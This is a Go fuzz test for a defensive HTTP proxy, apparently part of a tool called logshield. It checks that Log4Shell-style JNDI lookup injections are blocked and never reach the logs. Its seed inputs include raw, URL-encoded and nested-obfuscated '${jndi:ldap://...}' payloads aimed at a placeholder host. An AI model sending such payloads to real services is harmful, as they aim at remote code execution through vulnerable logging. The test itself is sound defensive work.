package proxy

import (
	"io"
	"log/slog"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"

	"github.com/TurlaFSB/logshield/internal/engine"
)

// FuzzNothingMaliciousLeaves drives the real handler in block mode with an
// in-memory upstream and checks the proxy's core promise for arbitrary input:
// no panic, no log line containing "${", and whatever reaches the upstream is
// not malicious according to the engine (the forwarded request is re-inspected
// from the outside, independently of the proxy's own snapshot).
func FuzzNothingMaliciousLeaves(f *testing.F) {
	seeds := [][3]string{
		{"/", "curl/8", ""},
		{"/?q=a", "${jndi:ldap://x.invalid/a}", ""},
		{"/%24%7Bjndi:ldap://x.invalid/a%7D", "ua", ""},
		{"/p", "ua", "x=${${lower:j}ndi:ldap://x.invalid/a}"},
		{"/p", "ua", "x=%24%7Bjndi%3Aldap%3A%2F%2Fx.invalid%2Fa%7D"},
	}
	for _, s := range seeds {
		f.Add(s[0], s[1], s[2])
	}
	f.Fuzz(func(t *testing.T, target, header, body string) {
		if !validForServer(target, true) || !validForServer(header, false) {
			t.Skip("a real HTTP server cannot deliver this")
		}
		sink := &logSink{}
		var out *http.Request
		var outBody []byte
		p, err := New(Config{
			Upstream: mustURL("http://up.invalid"),
			Mode:     ModeBlock,
			Logger:   slog.New(slog.NewJSONHandler(sink, nil)),
			Transport: roundTripFunc(func(r *http.Request) (*http.Response, error) {
				out = r
				if r.Body != nil {
					outBody, _ = io.ReadAll(r.Body)
				}
				return &http.Response{StatusCode: http.StatusOK, Body: http.NoBody, Header: http.Header{}, Request: r}, nil
			}),
		})
		if err != nil {
			t.Fatal(err)
		}
		req := httptest.NewRequest(http.MethodPost, "http://proxy.test/", strings.NewReader(body))
		req.RequestURI = target
		req.Header.Set("User-Agent", header)
		rec := httptest.NewRecorder()
		p.ServeHTTP(rec, req)

		if strings.Contains(sink.String(), "${") {
			t.Fatalf("log contains a live lookup: %q", sink.String())
		}
		if out == nil {
			return
		}
		// Re-inspect what actually left the proxy.
		sent := &http.Request{Method: out.Method, RequestURI: out.URL.RequestURI(), Host: out.Host, Header: out.Header}
		v := engine.Inspect(newSnapshot(sent, outBody).engineRequest(), engine.Config{})
		if v.Decision == engine.DecisionMalicious {
			t.Fatalf("a malicious request was forwarded: target=%q header=%q body=%q rules=%v", target, header, body, v.RuleIDs())
		}
	})
}

// validForServer reports whether s could arrive through Go's HTTP server.
func validForServer(s string, target bool) bool {
	for i := 0; i < len(s); i++ {
		c := s[i]
		if c < 0x20 && c != '\t' || c == 0x7f {
			return false
		}
		if target && (c == ' ' || c >= 0x80) {
			return false
		}
	}
	return !target || s != ""
}
